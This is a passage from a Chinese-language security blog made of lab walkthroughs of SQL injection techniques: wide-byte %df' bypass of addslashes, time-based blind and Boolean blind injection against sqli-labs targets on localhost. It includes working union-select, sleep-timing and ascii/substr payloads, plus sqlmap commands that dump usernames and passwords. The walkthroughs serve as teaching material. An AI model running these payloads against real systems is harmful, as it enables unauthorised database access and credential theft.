<h2 id="addslashes-函数"><a href="#addslashes-函数" class="headerlink" title="addslashes()函数"></a>addslashes()函数</h2><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">addslashes <span class="punctuation">(</span> string `$str` <span class="punctuation">)</span> <span class="operator">:</span> string</span><br><span class="line"></span><br><span class="line">返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。</span><br><span class="line">这些字符是单引号（`&#x27;`）、双引号（`&quot;`）、反斜线（`\`）与 NUL（**`null`** 字符）。</span><br><span class="line"></span><br><span class="line">只要注入&#x27;  &quot;  \ 空字符 都会转义为 \&#x27;  \&quot; \\ \   </span><br><span class="line">魔术单引号同理【PHP5.4及其以上魔术引号是被删除了】</span><br></pre></td></tr></table></figure>

<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>如果网站使用了 addslashes()函数函数或者开启了魔术单引号，恰巧MYSQL数据库为GBK，就会造成宽字节注入</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%DF</span>&#x27;:    </span><br><span class="line"></span><br><span class="line">- 会被PHP当中的addslashes函数转义为：<span class="variable">%DF</span>\&#x27;   </span><br><span class="line">- \ 会被URL编码为 <span class="variable">%5</span>C</span><br><span class="line">- 那么 <span class="variable">%DF</span>&#x27;  会被转义为 <span class="variable">%DF</span><span class="variable">%5</span>C<span class="variable">%27</span></span><br><span class="line">- <span class="variable">%DF</span><span class="variable">%5</span>C<span class="variable">%27</span>是一个宽字节 也就是一个縗&#x27;</span><br><span class="line">从而可以进行构造闭合，进行注入</span><br><span class="line">小技巧：有的时候我们也可以用<span class="number">16</span>进制来代替字符串</span><br></pre></td></tr></table></figure>

<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>%27———单引号</p>
<p>%20———-空格</p>
<p>%23———–#号</p>
<p>%5c————\反斜杠</p>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210410123856157.png" alt="在这里插入图片描述"></p>
<p>2、使用反斜杠进行探测<br>明明只输入了一个反斜杠，在查询语句中却出现了两个<br><img src="https://img-blog.csdnimg.cn/20210410124011684.png" alt="在这里插入图片描述"></p>
<p>输入一个单引号却出现反斜杠+单引号<br><img src="https://img-blog.csdnimg.cn/20210410124145409.png" alt="在这里插入图片描述"></p>
<p>3、有此可以判断，使用了转义函数addslashes()或者魔术引号，试一试可否进行宽字节注入<br>输入%df’，页面报错，好事情<br><img src="https://img-blog.csdnimg.cn/20210410124429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3Cmark%3E,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4、在’后加上注释符– q<br>页面返回正常，存在宽字节注入<br><img src="https://img-blog.csdnimg.cn/20210410124608697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3C/mark%3E,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5、使用order by 判断字段数<br><img src="https://img-blog.csdnimg.cn/20210410124718976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410124738583.png" alt="在这里插入图片描述"><br>可知字段数为3</p>
<p>6、使用联合查询，探测回显点<br>得到回显点2,3<br><img src="https://img-blog.csdnimg.cn/20210410124939915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>7、使用version()，查询数据库版本号<br><img src="https://img-blog.csdnimg.cn/20210410125041699.png" alt="在这里插入图片描述"><br>5.0以上版本，可以使用information_schema数据库得出数据</p>
<p>8、使用limit依次爆出表名</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?id=0%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,table_name <span class="keyword">from</span> </span><br><span class="line">information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>-- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210410140314506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>9、查看china_flag表下的字段名<br>使用联合查询时</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?<span class="attribute">id</span>=0%df&#x27; union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;china_flag&#x27;</span>-- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210410140621232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>此时可采用子查询的方式</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=0%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> </span><br><span class="line">table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=</span><br><span class="line"> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"> -- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210410141019719.png" alt="在这里插入图片描述"><br>得到china_flag表下的Id和C_Flag字段</p>
<p>10、使用limit依次爆出Id和C_Flag字段信息</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?id=<span class="number">0</span>%df&#x27; union select <span class="number">1</span>,Id,C_Flag from china_flag limit <span class="number">0</span>,<span class="number">1</span>-- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210410141359608.png" alt="在这里插入图片描述"></p>
<h1 id="SQLMap跑宽字节注入"><a href="#SQLMap跑宽字节注入" class="headerlink" title="SQLMap跑宽字节注入"></a>SQLMap跑宽字节注入</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在已知存在宽字节注入的情况下，可使用sqlmap的参数：</span><br><span class="line"> <span class="comment">--tamper  unmagicquotes.py</span></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">SQL注入-时间盲注</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-11 13:18:53" itemprop="dateCreated datePublished" datetime="2022-11-11T13:18:53+08:00">2022-11-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-07 21:29:28" itemprop="dateModified" datetime="2023-03-07T21:29:28+08:00">2023-03-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入-时间盲注"><a href="#SQL注入-时间盲注" class="headerlink" title="SQL注入-时间盲注"></a>SQL注入-时间盲注</h1><hr>
<p>时间盲注也称为延时注入</p>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>如果说基于Boolean的盲注在页面上可以看到0 or 1 的回显，那么时间盲注完全啥都看不到，但可以通过特定的输入，判断后台的执行时间，从而确定注入</p>
<h2 id="所用函数"><a href="#所用函数" class="headerlink" title="所用函数"></a>所用函数</h2><ul>
<li><p>sleep() 让程序挂起，单位秒</p>
</li>
<li><p>if(condition,value_if_true,value_if_false)</p>
<p>语法：当condition为真时，返回value_if_true，否则返回value_if_false</p>
</li>
<li><p>length() 获取字符串的长度</p>
</li>
<li><p>substr() 截取字符串</p>
<p>语法：substr(string,num start,num length)</p>
<p>string 字符串；start 起始位置(从1开始)；截取长度</p>
</li>
<li><p>ascii() 把字符转换为ascii码值</p>
</li>
</ul>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210409202345116.png" alt="在这里插入图片描述"><br>2、输出错误参数，页面无变化<br><img src="https://img-blog.csdnimg.cn/20210409202441968.png" alt="在这里插入图片描述"><br>3、加上 and sleep()函数 尝试让页面休眠10秒<img src="https://img-blog.csdnimg.cn/20210409203100421.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210409203146716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>页面貌似延迟为2s</p>
<p>没有执行sleep()函数，猜想会不会是字符串型，换为’ and sleep(10) – q<br><img src="https://img-blog.csdnimg.cn/20210409203333469.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210409203418650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>执行成功，判断存在时间盲注</p>
<p>4、探测if语句是否可以使用<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-9/?id=1">http://127.0.0.1/sqli/Less-9/?id=1</a>‘ and if(1&#x3D;2,sleep(20),null) – q<br><img src="https://img-blog.csdnimg.cn/20210409204538268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-9/?id=1">http://127.0.0.1/sqli/Less-9/?id=1</a>‘ and if(1&#x3D;1,sleep(20),null) – q<br><img src="https://img-blog.csdnimg.cn/20210409204707185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>5、if语句可以使用，进行判断版本号</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">9</span>/?id=<span class="number">1</span>&#x27; and if( length(substr(select version(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">5</span>,null,sleep(<span class="number">5</span>)) -- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409205104427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>版本号为5.0版本以上</p>
<p>6、判断当前数据库名</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">9</span>/?id=<span class="number">1</span>&#x27; and  if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)) &gt;<span class="number">120</span>,null,sleep(<span class="number">5</span>)) -- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409205743844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">9</span>/?id=<span class="number">1</span>&#x27; and  if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)) &lt;<span class="number">120</span>,null,sleep(<span class="number">5</span>)) -- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409205942466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">9</span>/?id=<span class="number">1</span>&#x27; and  if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)) =<span class="number">115</span>,null,sleep(<span class="number">5</span>)) -- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409210159662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210409193957463.png" alt="在这里插入图片描述"><br>得知第一个单词为s</p>
<p>按照以上步骤，依次猜解<br>最终得到当前数据库名为security</p>
<p>7、其他信息与上述步骤同理，一个一个猜解<br>8、由于太过于费事费力，可以使用自动化工具SQLMap</p>
<h2 id="SQLMap跑时间盲注"><a href="#SQLMap跑时间盲注" class="headerlink" title="SQLMap跑时间盲注"></a>SQLMap跑时间盲注</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用 --technique 指定SQLMap探测技术</span><br><span class="line">支持的探测方式有：</span><br><span class="line"> - <span class="keyword">B: </span>基于<span class="keyword">Boolean的盲注（Boolean </span><span class="keyword">based </span><span class="keyword">blind） </span></span><br><span class="line"> - Q: 内联查询（inlin queries） </span><br><span class="line"> - T:基于时间的盲注（time <span class="keyword">based </span><span class="keyword">blind） </span></span><br><span class="line"> - U: 联合查询（union query <span class="keyword">based） </span></span><br><span class="line"> - E: 错误（errorbased）</span><br><span class="line"> </span><br><span class="line"> -time-sec参数设定延时时间，默认是<span class="number">5</span>秒。</span><br></pre></td></tr></table></figure>

<p>1、得出当前数据库名</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&quot;</span> --technique <span class="built_in">T</span> --<span class="built_in">time</span>-<span class="built_in">sec</span> <span class="number">3</span> --current-<span class="built_in">db</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409212346674.png" alt="在这里插入图片描述"></p>
<p>2、得出security数据库下的表面</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&quot;</span> <span class="attr">--technique</span> T <span class="attr">--time-sec</span> <span class="number">3</span> -D security <span class="attr">--tables</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2021040921464930.png" alt="在这里插入图片描述"></p>
<p>3、跑 users表下面的字段</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&quot;</span> --technique <span class="built_in">T</span> --<span class="built_in">time</span>-<span class="built_in">sec</span> <span class="number">3</span> -D security -<span class="built_in">T</span> users</span><br><span class="line"> --<span class="built_in">columns</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409212137686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>4、跑出跑出users表中跑出id、username、password字段数据</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&quot;</span> --technique <span class="built_in">T</span> --<span class="built_in">time</span>-<span class="built_in">sec</span> <span class="number">3</span> -D security -<span class="built_in">T</span> users</span><br><span class="line"> -C id,username,password --dump</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409212101436.png" alt="在这里插入图片描述"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/10/SQL%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/11/10/SQL%E6%B3%A8%E5%85%A5-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">SQL注入-布尔盲注</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-10 10:18:02" itemprop="dateCreated datePublished" datetime="2022-11-10T10:18:02+08:00">2022-11-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-07 23:26:32" itemprop="dateModified" datetime="2023-03-07T23:26:32+08:00">2023-03-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入-布尔盲注"><a href="#SQL注入-布尔盲注" class="headerlink" title="SQL注入-布尔盲注"></a>SQL注入-布尔盲注</h1><hr>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>在有些情况下，后台使用了错误信息屏蔽方法（比如@），屏蔽了报错，</p>
<p>无法在根据报错信息来进行注入的判断，该情况称为”盲注”</p>
<h2 id="表现形式"><a href="#表现形式" class="headerlink" title="表现形式"></a>表现形式</h2><p>based boolean （布尔盲注）</p>
<p>based time（时间盲注）</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>传入“”错误“”参数和“正确”参数，观察页面是否发生了变化</p>
<h2 id="所用函数"><a href="#所用函数" class="headerlink" title="所用函数"></a>所用函数</h2><ul>
<li><p>length() 获取字符串的长度</p>
</li>
<li><p>substr() 截取字符串</p>
<p>语法：substr(string,num start,num length)</p>
<p>string 字符串；start 起始位置(从1开始)；截取长度</p>
</li>
<li><p>ascii() 把字符转换为ascii码值</p>
</li>
</ul>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，只显示了you are in..<br><img src="https://img-blog.csdnimg.cn/20210409191805971.png" alt="在这里插入图片描述"><br>.2、将1改为0，观察页面是否发生了变化<br>you are in… 这三个单词不见了<br>页面发生变化<br><img src="https://img-blog.csdnimg.cn/20210409191915954.png" alt="在这里插入图片描述"></p>
<p>3、貌似是布尔盲注,通过探测得知为字符型布尔盲注<br><img src="https://img-blog.csdnimg.cn/20210409192627624.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210409192638644.png" alt="在这里插入图片描述"></p>
<p>4、使用substr() 探测数据库版本号<br>本地操作：<br><img src="https://img-blog.csdnimg.cn/20210409193324370.png" alt="在这里插入图片描述"></p>
<p>靶场：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">8</span>/?id=<span class="number">1</span>&#x27; and substr(version(),<span class="number">1</span>,<span class="number">1</span>)  = <span class="number">5</span>-- q</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409193215482.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021040919322856.png" alt="在这里插入图片描述"><br>5、版本号5.0以上，使用length() 探测数据库名的长度</p>
<p><img src="https://img-blog.csdnimg.cn/2021040919354449.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210409193555975.png" alt="在这里插入图片描述"><br>6、得知数据库名长度为8，可进行猜单词，会不会是security，8个字母<br>使用 substr()、ascii()验证猜想<br><img src="https://img-blog.csdnimg.cn/20210409193957463.png" alt="在这里插入图片描述"><br>得知s字母的在ASCII码表中的数字是115<br>故可以构造poc</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409194232892.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210409194244393.png" alt="在这里插入图片描述"><br>可以验证当前数据库名的第一个单词是s，猜想正确</p>
<p>验证第二个<br><img src="https://img-blog.csdnimg.cn/20210409194332763.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202104091943526.png" alt="在这里插入图片描述"><br>第二个单词为e，猜想正确<br>接下来进行一一猜解<br>7、知道了数据库名后，又知道版本号为5.0以上版本，故可利用information_schema数据库进行爆出相关数据<br>利用方法与上一步同理<br>8、由于一个单词一个单词猜解，过于费时费力，所以可以使用自动化工具SQLMap</p>
<h2 id="SQLMap跑布尔盲注"><a href="#SQLMap跑布尔盲注" class="headerlink" title="SQLMap跑布尔盲注"></a>SQLMap跑布尔盲注</h2><p><strong>基本操作</strong></p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 可以使用 --technique 指定SQLMap探测技术</span><br><span class="line">支持的探测方式有：</span><br><span class="line"> - <span class="keyword">B: </span>基于<span class="keyword">Boolean的盲注（Boolean </span><span class="keyword">based </span><span class="keyword">blind） </span></span><br><span class="line"> - Q: 内联查询（inlin queries） </span><br><span class="line"> - T:基于时间的盲注（time <span class="keyword">based </span><span class="keyword">blind） </span></span><br><span class="line"> - U: 联合查询（union query <span class="keyword">based） </span></span><br><span class="line"> - E: 错误（errorbased） </span><br></pre></td></tr></table></figure>

<p>1、由于已经知道存在 布尔盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;http://127.0.0.1/sqli/Less-8/?id=1&quot; <span class="comment">--technique B --current-db</span></span><br></pre></td></tr></table></figure>

<p>得出当前数据库名security<br><img src="https://img-blog.csdnimg.cn/20210409201132317.png" alt="在这里插入图片描述"></p>
<p>2、跑security数据库下的表面</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://127.0.0.1/sqli/Less-8/?id=1&quot;</span> <span class="attr">--technique</span> B -D security </span><br><span class="line"><span class="attr">--tables</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409201932839.png" alt="在这里插入图片描述"></p>
<p>3、跑出 users表下的字段名</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://127.0.0.1/sqli/Less-8/?id=1&quot;</span> <span class="attr">--technique</span> B -D security -T users <span class="attr">--columns</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210409212137686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>4、跑出id、username、password的数据</p>
